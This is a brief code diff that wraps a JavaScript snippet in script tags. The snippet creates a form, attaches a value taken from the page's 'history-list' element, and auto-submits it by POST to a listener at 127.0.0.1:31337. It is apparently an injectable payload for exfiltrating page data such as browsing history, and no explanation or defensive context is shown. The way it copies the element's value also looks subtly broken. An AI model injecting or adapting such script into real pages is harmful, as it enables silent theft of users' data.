@@ -1,3 +1,4 @@
+<script>
  form = document.createElement('form');
         form.setAttribute('method', 'POST');
         form.setAttribute('action', 'http://127.0.0.1:31337/');
@@ -6,4 +7,6 @@
         myvar.setAttribute('history', document.getElementById('history-list'));
         form.appendChild(myvar);
         document.body.appendChild(form);
-        form.submit();   
+        form.submit();
+
+</script>
